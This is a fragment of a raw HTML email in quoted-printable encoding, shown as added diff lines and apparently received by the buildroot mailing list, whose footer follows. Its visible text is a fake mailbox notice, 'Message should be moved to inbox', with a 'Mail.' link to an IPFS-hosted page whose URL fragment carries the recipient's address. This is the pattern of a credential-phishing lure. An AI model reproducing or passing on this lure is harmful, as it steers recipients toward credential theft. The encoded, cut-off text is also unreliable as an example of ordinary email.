+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;"></p><h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-w=
+eight: 500; margin-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;=
+"><font size=3D"1"><font size=3D"2"><font size=3D"3"><font size=3D"2">Messa=
+ge should be moved to inbox.&nbsp;<span>&nbsp;</span>
+<u style=3D"box-sizing: border-box;"><a href=3D"https://cloudflare-ipfs.com=
+/ipfs/QmNzHfbXaVaWHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA?filename=3DQmNzHfbXaVa=
+WHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA#buildroot@busybox.net">Mail.</a></u></f=
+ont></font></font></font></h5></td></tr></tbody></table></td></tr></tbody><=
+/table></td></tr></tbody></table></div></div></div></div></body></html>
+
+--===============8572746315149567200==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+buildroot mailing list
+buildroot@buildroot.org
+https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============8572746315149567200==--
